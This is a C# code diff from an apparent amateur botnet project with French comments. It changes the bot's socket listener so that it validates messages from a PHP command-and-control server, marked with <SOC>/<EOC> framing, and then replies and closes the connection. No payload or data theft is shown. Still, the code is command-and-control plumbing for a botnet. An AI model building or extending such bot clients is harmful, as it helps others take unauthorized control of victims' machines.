@@ -44,13 +44,33 @@ namespace Botnet
                         int bytesRec = handler.Receive(buff);
                         data += Encoding.ASCII.GetString(buff, 0, bytesRec);
 
-                        if (data.IndexOf("<EOF>") > -1)
-                        {
-                            break;
-                        }
-                    }
 
+                        string response = "";
+                        byte[] buffers = new byte[1024];
+
+                        if (DataIntegrity(data) == true)
+                        {
+                            //Réponse au CNC:
+                            response = "<SOC>OK<EOC>";
+                        }
+                        else
+                        {
+                            //Réponse au CNC:
+                            response = "<SOC>Received a misformed message: {" + data +"}<EOC>";
+                        }
+                        //Encodage de la réponse:
+                        buffers = UTF8Encoding.UTF8.GetBytes(response);
+                        //Envoi de la réponse:
+                        handler.Send(buffers);
+                        //On ferme le socket, pour que PHP du CNC arrête d'attendre la réponse:
+                        handler.Close();
+                        //On recommence à écouter:
+                        break;
+                    }
+                    //Contrôle de l'intégrité des données
+                    //bool mdr = DataIntegrity(data);
                     Console.WriteLine("Text received : " + data);
+                    data = null;
                 }
             }
 
@@ -59,6 +79,24 @@ namespace Botnet
                 status = e.Message;
             }
 
+        }
+
+        public bool DataIntegrity(string data)
+        {
+            int i = data.Length;
+
+            //Si la donnée ne commence pas par <SFC>
+            if (data.Substring(0,5) != "<SOC>")
+            {
+                return false;
+            }
+
+            //Si la donnée ne termine pas par <EFC>
+            if (data.Substring(data.Length - 5) != "<EOC>")
+            {
+                return false;
+            }
+            return true;
         }
     }
 }
